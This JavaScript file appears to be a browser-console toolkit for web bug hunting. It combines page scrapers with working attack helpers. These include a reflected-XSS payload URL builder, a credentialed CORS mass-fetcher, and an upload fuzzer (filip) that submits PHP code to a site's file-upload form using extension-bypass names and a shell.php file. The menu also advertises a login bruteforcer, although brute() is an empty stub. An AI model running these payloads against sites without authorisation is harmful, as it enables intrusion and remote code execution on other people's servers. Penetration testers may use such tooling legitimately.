// Function create using ChatGPT
// Status: not tested for now
// I need to test it later) I hope this will help for manual bug hunters, and especially in sites where automation is strongly getting blocked
// My prompt
/*
now make it a function  and collect all iframes src links inside iframe key and other inside a key   like   {'iframe': [....], 'a': []}   
and also add same thing for form  and after action  check with regexp if there is no action="http*"  then  url should be window.location.href+"/"+formActionLink  if non window.location.href doesn't have  / in the end and  
if  formActionLink doesn't have / in it's begining  also with same logic get valid url   considering that action can also be =./endpoint   so here we also have to check if window.location.href is ending with /  thean substring 
fromActionLink 2 else substring 1  so the slash will come and concatenate with window.location.href and we will get valid url  got me??      also with same logic  get all input type=hidden     in inp.hidden   this  all should be  tags  object  
so if I select tags.inp.hidden  I want output like    [{'value':'text1', 'name':'some'}, {'value':'some', 'name':'some'}]   and if u can generate not only for input hidden but for more input types that will help with finding RXSS  
u can put alll these  inn function all  after  calling all()    tags object should be generating  with all described things I told
*/


function collectTags(document) {
    const tags = {
        'a': [],
        'iframe': [],
        'form': []
    };

    // Collect all <a>, <iframe>, and <form> elements
    document.querySelectorAll("a, iframe, form").forEach(element => {
        if (element.tagName === 'A') {
            tags['a'].push(element.href);
        } else if (element.tagName === 'IFRAME') {
            tags['iframe'].push(element.src);
        } else if (element.tagName === 'FORM') {
            const formObj = {
                'action': validateFormAction(element.action),
                'inputs': collectFormInputs(element)
            };
            tags['form'].push(formObj);
        }
    });

    return tags;
}

// Function to validate form action URL
function validateFormAction(action) {
    const regex = /^http(s)?:\/\//;
    if (!regex.test(action)) {
        const baseUrl = window.location.href.endsWith('/') ? window.location.href : window.location.href + '/';
        const formActionLink = action.startsWith('./') ? action.substring(2) : action;
        const validUrl = baseUrl + (formActionLink.startsWith('/') ? formActionLink.substring(1) : formActionLink);
        return validUrl;
    }
    return action;
}

// Function to collect inputs within form
function collectFormInputs(formElement) {
    const inputs = [];
    formElement.querySelectorAll('input').forEach(input => {
        if (input.type === 'hidden') {
            inputs.push({
                'value': input.value,
                'name': input.name
            });
        }
        // Add more conditions here for other input types if needed
    });
    return inputs;
}

// Example usage
//const tags = collectTags(document);
//console.log(tags);

function axss() {

let inputs=document.getElementsByTagName("input");
let payload="axss%27%22%3c"; let injection="";
for (i=0;i<inputs.length;i++) {
    injection+="&"+inputs[i].name+"="+payload;
}
injection=injection.replace("&","?");
console.log("Visit & inspect: "+window.location.origin+window.location.pathname+injection);

}function brute() {
    return "";
}async function corscheck(num=0) {
    const input = prompt("Enter domains (newline separated):");
    if (!input) return;
  
    const domains = input.split('\n').map(d => d.trim()).filter(Boolean);
    const successful = [];
  
    for (const domain of domains) {
      const url = `https://${domain}/`;
  
      try {
        const res = num==0 ? await fetch(url, { mode: 'cors' }) : await fetch(url, { mode: 'cors', credentials:'include' }) ;
        console.log(`✅ Fetched: ${url}`);
        successful.push(domain);
      } catch (e) {
        console.log(`❌ Failed: ${url}`);
      }
    }
  
    console.log(`\n🎯 Accessible subs:\n`, successful.join('\n'));
  }/////////////////////////
//////    NOTE    ///////
/////////////////////////
// Any of these two functions can be used, but there is a small difference between them tho
// When using first one, let's say you do alert() each time, whenever you close the alert then only the timer will continue,
// meanwhile the second script won't care, so if you press alert late intentanoally you will see next alert poping up at light speed,
// so I think in scripts that require user interaction you can use the first one
// but tbh I don't know in what any other situations this could cause trouble or advantage over one another, so I will just keep both
//
/////////////////////////
///  example scripts  ///
/////////////////////////
//  /* This will generate all 4 digit numbers and log them with pause of 0.2 seconds each time */
// easyLoopLimiter( 0, 10000, 200, "let a = (i - ( i % 1000 ) ) / 1000; let b = ( i - ( i % 100 ) ) / 100; let c = ( i - ( i % 10) ) / 10; let d = i % 10; console.log( a.toString() + b.toString() + c.toString() + d.toString() )" )
//
// /* Or you can have your function maybe for making a fetch requests continously or something custom? */ 
// easyLoopLimiter( 0, 1000, 300, 'yourCustomFunction()')
//
// /* You can pass increasing parameter i to your custom function like this */
// easyLoopLimiter( 0, 5, 100, 'custom(i)' );  function custom(n) { alert(n) }
//
//

function easyLoopLimiter(loopStrtNum, loopEndNum, timeToPause, yourFunction) {

    function loop(i) {
        if (i < loopEndNum) {
            eval(yourFunction);
            setTimeout(() => {
                i++;
                loop(i)
            }, timeToPause);
        } else {
            return;
        }
    }

    setTimeout(() => {
        loop(loopStrtNum)
    }, timeToPause);


}


function easyLoopLimiter2(loopStrtNum, loopEndNum, timeToPause, yourFunction) {

    let i = loopStrtNum;
    let a = setInterval(() => {
        eval(yourFunction);
        i++;
        if (i == loopEndNum) {
            clearInterval(a)
        }
    }, timeToPause)

}
function filip(fileInput = null, formElement = null) {
    fileInput = fileInput || document.querySelector('input[type="file"]');
    formElement = formElement || document.querySelector('form');

    if (!fileInput || !(fileInput instanceof HTMLInputElement)) {
        console.warn("File input not found");
        return;
    }

    if (!formElement || !(formElement instanceof HTMLFormElement)) {
        console.warn("Form element not found");
        return;
    }

    const payload = '<?php echo "I am POC"; ?>';

    const baseFiles = [
        { ext: 'png', mime: 'image/png', header: [0x89, 0x50, 0x4E, 0x47] },
        { ext: 'jpg', mime: 'image/jpeg', header: [0xFF, 0xD8, 0xFF] },
        { ext: 'gif', mime: 'image/gif', header: [0x47, 0x49, 0x46, 0x38] },
        { ext: 'pdf', mime: 'application/pdf', header: [0x25, 0x50, 0x44, 0x46] }
    ];

    const testFiles = [];

    for (const f of baseFiles) {
        testFiles.push(
            { name: `${f.ext}.php`, mime: f.mime, header: f.header },
            { name: `test.${f.ext}%00.php`, mime: f.mime, header: f.header },
            { name: `test.php%00.${f.ext}`, mime: f.mime, header: f.header },
            { name: `test.php;.${f.ext}`, mime: f.mime, header: f.header },
            { name: `test.${f.ext};.php`, mime: f.mime, header: f.header }
        );
    }

    testFiles.push({
        name: 'shell.php',
        mime: 'application/x-php',
        header: [0x3C, 0x3F, 0x70, 0x68] // "<?ph"
    });

    const generateBlob = (headerBytes, phpCode, mimeType) => {
        const header = new Uint8Array(headerBytes);
        const code = new TextEncoder().encode(phpCode);
        const full = new Uint8Array(header.length + code.length);
        full.set(header, 0);
        full.set(code, header.length);
        return new Blob([full], { type: mimeType });
    };

    const runTests = async () => {
        const action = formElement.getAttribute('action') || window.location.href;
        const method = (formElement.getAttribute('method') || 'GET').toUpperCase();

        for (let file of testFiles) {
            const blob = generateBlob(file.header, payload, file.mime);
            const testFile = new File([blob], file.name, { type: file.mime });

            const formData = new FormData();

            // Clone all inputs (hidden or not)
            formElement.querySelectorAll('input').forEach(input => {
                if (input.type === 'file') {
                    formData.append(input.name || 'file', testFile);
                } else if (input.name) {
                    formData.append(input.name, input.value);
                }
            });

            console.log(`[*] Uploading: ${file.name} (MIME: ${file.mime})`);

            try {
                const res = await fetch(action, {
                    method: method,
                    body: formData,
                    credentials: 'include'
                });

                const text = await res.text();
                console.log(`[+] Status: ${res.status} | Length: ${text.length}`);
                if (/I am POC/.test(text)) {
                    console.warn(`[!!!] Found payload execution in response! => ${file.name}`);
                }

            } catch (err) {
                console.error(`[!] Fetch failed:`, err);
            }

            await new Promise(r => setTimeout(r, 1500));
        }

        alert("✅ filip() completed — check console + network tab!");
    };
// block any native submission
formElement.addEventListener('submit', e => e.preventDefault());
formElement.querySelectorAll('button, input[type="submit"]').forEach(btn => {
    btn.addEventListener('click', e => e.preventDefault());
});
    runTests();
}
function showhtml() {
// dumb function but I love it, make sure you are in data:, or in safe domain just in case
let a=prompt(); document.body.innerHTML=a;
}
function links() {
// Define a regular expression to match URLs
const urlRegex = /\bhttps?:\/\/[^\s/$.?#].[^\s]*\b/g;

// Get the text content of the document
const documentText = document.body.innerHTML;

// Use the regular expression to find all URLs in the document
const urls = documentText.match(urlRegex);

// Log the extracted URLs to the console
return urls;

}
function mails() {
// Assuming you want to extract email addresses from a document using JavaScript

// Define a regular expression to match email addresses
const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;

// Get the text content of the document
const documentText = document.body.innerHTML;

// Use the regular expression to find all email addresses in the document
const emails = documentText.match(emailRegex);

// Log the extracted email addresses to the console
return emails;

}

function menu() {
    const reset = "\x1b[0m";
    const bold = "\x1b[1m";
    const cyan = "\x1b[36m";
    const yellow = "\x1b[33m";
    const magenta = "\x1b[35m";
    const green = "\x1b[32m";
  
    console.log(`
  ${bold}${cyan}=== Useful Functions Menu ===${reset}
  
  ${yellow}1) corscheck()${reset}
     ${magenta}- Mass fetch in CORS mode across [sub]domains
     - Check for accessible targets (useful for POST XSS CSRF)
  
  ${yellow}2) easyLoopLimiter()${reset}
     ${magenta}- Helps prevent CPU burnouts in heavy loops
  
  ${yellow}3) links()${reset}
     ${magenta}- Collects links from current page
     - Logs as array
  
  ${yellow}4) mails()${reset}
     ${magenta}- Extracts emails from current page
     - Logs as array
  
  ${yellow}5) toki()${reset}
     ${magenta}- Decodes Base64 tokens
     - Auto URL-decodes and replaces safe chars
  
  ${yellow}6) brute()${reset}
     ${magenta}- Auto-detects login inputs (user/pass)
     - Launches bruteforce attempt (for legal testing only)
  `);
  }
  function rmreq() {

// Select all elements with the 'required' attribute
const requiredElements = document.querySelectorAll('[required]');

// Iterate through each element and remove the 'required' attribute
requiredElements.forEach(element => {
    element.removeAttribute('required');
});

console.log('All required attributes have been removed.');
}
function rall() {
let a=prompt("Text: "),b=prompt("Replace what?: "),c=prompt("Replace with?: "); document.body.innerText=a.replaceAll(b,c)
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////  For some rzeason you can't call Shuffler continously, so                                                            /////
////  you might need to reload page import script and than again run Shuffler().                                         /////
////  This could be from eighter chrome blocking multi-download, eighter I have some iteration problem in the script     /////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Examples to run - Shuffler( ['t', 'e', 'x', 't'] )
// also you can run with additional prefix suffix and stringToJoin for ex. Shuffler( [555, '@'], '[', ']', ',')   -  This will make an array format.
// I think this is a useful script for some fuzzing


function Shuffler(array, prefix = '', suffix = '', stringToJoin = '') {
    let fileContent;
    if (array === undefined) {
        return console.error('%cError: First parameter must be defined', 'color: yellow; font-weight: bold;');
    } else if (!Array.isArray(array)) {
        return console.error('%cError: First parameter must be an Array', 'color: yellow; font-weight: bold;');
    }
    fileContent = '';
    let l = array.length;
    let ml = l - 1;
    for (let i = 0; i < factorial(l); i++) {
        let k = i % ml;
        swap(array, ml - k, ml - k - 1);
        fileContent += prefix + array.join(stringToJoin) + suffix + "\n"
    }
    createAndDownloadFile(fileContent)

}


window.swap=function (myArray, x, y) {
    [myArray[x], myArray[y]] = [myArray[y], myArray[x]];
}

function factorial(n) {
    if (n < 0) {
        return "number has to be positive."
    }
    if (n == 0 || n == 1) {
        return 1;
    } else {
        return n * factorial(n - 1);
    }
}

function createAndDownloadFile(fileContent) {
    alert();
    const blob = new Blob([fileContent], {
        type: 'text/plain'
    });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'example.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    a.href = '';
}
function toki(a) {console.log(atob(decodeURIComponent(a).replaceAll('_','/').replaceAll('-','+')))}
function unhideinp() {
document.querySelectorAll('input[type="hidden"]').forEach(input => {
    input.type = 'text';
});
}
let socks = {
  socket: null,
  isConnected: false,

  connect: function () {
    const url = prompt("Enter WSS URL (ex: wss://echo.websocket.org):");
    if (!url) return alert("No WSS URL provided!");

    this.socket = new WebSocket(url);

    this.socket.onopen = () => {
      this.isConnected = true;
      console.log(`[SOCKS] Connected to ${url}`);
      this.listen();
    };

    this.socket.onmessage = (e) => {
      console.log(`[SOCKS] ⬅ Received:`, e.data);
    };

    this.socket.onclose = () => {
      this.isConnected = false;
      console.log(`[SOCKS] Disconnected from ${url}`);
    };

    this.socket.onerror = (e) => {
      console.error(`[SOCKS] ❌ Error:`, e);
    };
  },

  listen: function () {
    console.log('[SOCKS] Type `socks.send()` to send data or `socksexit()` to disconnect');

    this.send = () => {
      if (!this.isConnected) return console.warn("[SOCKS] Not connected!");
      const msg = prompt("Enter message to send:");
      if (!msg) return;
      try {
        const parsed = JSON.parse(msg);
        this.socket.send(JSON.stringify(parsed));
        console.log("[SOCKS] ➡ Sent JSON:", parsed);
      } catch (e) {
        this.socket.send(msg);
        console.log("[SOCKS] ➡ Sent text:", msg);
      }
    };
  },

  disconnect: function () {
    if (this.socket) {
      this.socket.close();
      this.isConnected = false;
      console.log("[SOCKS] Manual disconnect.");
    }
  }
};

// Exit alias
function socksexit() {
  socks.disconnect();
}

// Connect alias
function socksconnect() {
  socks.connect();
}

console.log("%c[JS4Hacking] Main.js injected 🚀", "color: cyan");
